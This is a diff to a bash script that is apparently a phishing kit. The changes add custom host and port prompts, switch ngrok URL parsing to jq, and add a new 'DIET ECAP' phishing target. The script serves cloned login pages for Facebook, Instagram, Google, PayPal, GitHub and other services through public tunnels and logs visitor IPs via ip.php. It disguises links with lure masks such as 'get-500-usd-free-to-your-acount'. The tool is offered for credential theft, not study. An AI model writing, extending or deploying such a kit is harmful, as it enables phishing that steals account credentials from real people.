@@ -278,8 +278,36 @@ about() {
 HOST='127.0.0.1'
 PORT='8080'
 
+read_host(){
+	if [ -f .server/host.txt ]; then
+        HOST=$(cat .server/host.txt)
+    fi
+
+    if [ -f .server/port.txt ]; then
+        PORT=$(cat .server/port.txt)
+    fi
+}
+
+custom_host(){
+	echo -n "Do you want a custom host? [y/N]: "
+    read answer
+    if [ "$answer" != "${answer#[Yy]}" ] ;then
+        echo -n "Enter the custom host: "
+        read HOST
+		echo $HOST > .server/host.txt
+	fi
+
+	echo -n "Do you want a custom Port? [y/N]: "
+    read answer
+    if [ "$answer" != "${answer#[Yy]}" ] ;then
+        echo -n "Enter the custom port: "
+        read PORT
+		echo $PORT > .server/port.txt
+	fi
+}
+
 setup_site() {
-	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Setting up server for $website "${WHITE}
 	cp -rf sites/"$website"/* .server/www
 	cp -f  sites/ip.php .server/www/
 	echo -ne "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Starting PHP server..."${WHITE}
@@ -342,7 +370,9 @@ start_ngrok() {
 	fi
 
 	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+	# ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')
+	# ngrok_url1=${ngrok_url#https://}
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 1 : ${ORANGE}$ngrok_url"
 	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} URL 2 : ${ORANGE}$mask@$ngrok_url1"
@@ -412,6 +442,7 @@ start_loclx() {
 
 ## Start localhost
 start_localhost() {
+	custom_host
 	echo -e "\n${WHITE}[${GREEN}-${WHITE}]${BLUE} Initializing... ${GREEN}( ${ORANGE}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_small; }
@@ -561,62 +592,65 @@ main_menu() {
 
 		${WHITE}[${GREEN}::${WHITE}]${RED} 𝙋𝙃𝙄𝙎𝙃𝙄𝙉𝙂-𝙈𝙊𝘿𝙐𝙇𝙀𝙎: ${WHITE}[${GREEN}::${WHITE}]${RED}
 
-		${WHITE}[${GREEN}01${WHITE}]${BLUE} Facebook      ${WHITE}[${GREEN}02${WHITE}]${BLUE} Instagram       ${WHITE}[${GREEN}03${WHITE}]${BLUE} Google
+		${WHITE}[${GREEN}01${WHITE}]${BLUE} DIET ECAP		${WHITE}[${GREEN}02${WHITE}]${BLUE} Facebook      ${WHITE}[${GREEN}03${WHITE}]${BLUE} Instagram
 
-		${WHITE}[${GREEN}04${WHITE}]${BLUE} Snapchat      ${WHITE}[${GREEN}05${WHITE}]${BLUE} Microsoft       ${WHITE}[${GREEN}06${WHITE}]${BLUE} Linkedin
+		${WHITE}[${GREEN}04${WHITE}]${BLUE} Google   		${WHITE}[${GREEN}05${WHITE}]${BLUE} Snapchat      ${WHITE}[${GREEN}06${WHITE}]${BLUE} Microsoft
 
-		${WHITE}[${GREEN}07${WHITE}]${BLUE} Paypal        ${WHITE}[${GREEN}08${WHITE}]${BLUE} Twitter         ${WHITE}[${GREEN}09${WHITE}]${BLUE} Spotify
+		${WHITE}[${GREEN}07${WHITE}]${BLUE} Linkedin		${WHITE}[${GREEN}08${WHITE}]${BLUE} Paypal        ${WHITE}[${GREEN}09${WHITE}]${BLUE} Twitter
 
-		${WHITE}[${GREEN}10${WHITE}]${BLUE} Mediafire     ${WHITE}[${GREEN}11${WHITE}]${BLUE} Github
+		${WHITE}[${GREEN}10${WHITE}]${BLUE} Spotify		${WHITE}[${GREEN}11${WHITE}]${BLUE} Mediafire     ${WHITE}[${GREEN}12${WHITE}]${BLUE} Github
 
 
-		${WHITE}[${GREEN}99${WHITE}]${BLUE} About         ${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit
+		${WHITE}[${GREEN}99${WHITE}]${BLUE} About		${WHITE}[${GREEN}00${WHITE}]${BLUE} Exit
 
 	EOF
 	
 	read -p "${WHITE}[${GREEN}-${WHITE}]${RED} 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉 𝙊𝙋𝙏𝙄𝙊𝙉 : ${RED}"
 
 	case $REPLY in 
-		1 | 01)
-			site_facebook;;
+		1 | 01 )
+			website="diet"
+			mask='http://get-1k-followers-on-github-free'
+			tunnel_menu;;
 		2 | 02)
-			site_instagram;;
+			site_facebook;;
 		3 | 03)
+			site_instagram;;
+		4 | 04)
 			site_gmail;;
-        4 | 04)
+        5 | 05)
 			website="snapchat"
 			mask='http://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-        5 | 05)
+        6 | 06)
 			website="microsoft"
 			mask='http://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
-		6 | 06)
+		7 | 07)
 			website="linkedin"
 			mask='http://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
-        7 | 07)
+        8 | 08)
 			website="paypal"
 			mask='http://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		8 | 08)
+		9 | 09)
 			website="twitter"
 			mask='http://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
-		9 | 09)
+		10)
 			website="spotify"
 			mask='http://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		10 | 10)
+		11)
 			website="mediafire"
 			mask='http://get-1TB-on-mediafire-free'
 			tunnel_menu;;
-		11 | 11)
+		12)
 			website="github"
 			mask='http://get-1k-followers-on-github-free'
 			tunnel_menu;;
-
-
+		
 		99)
 			about;;
 		0 | 00 )
@@ -634,4 +668,5 @@ dependencies
 install_ngrok
 install_cloudflared
 install_localxpose
+read_host
 main_menu
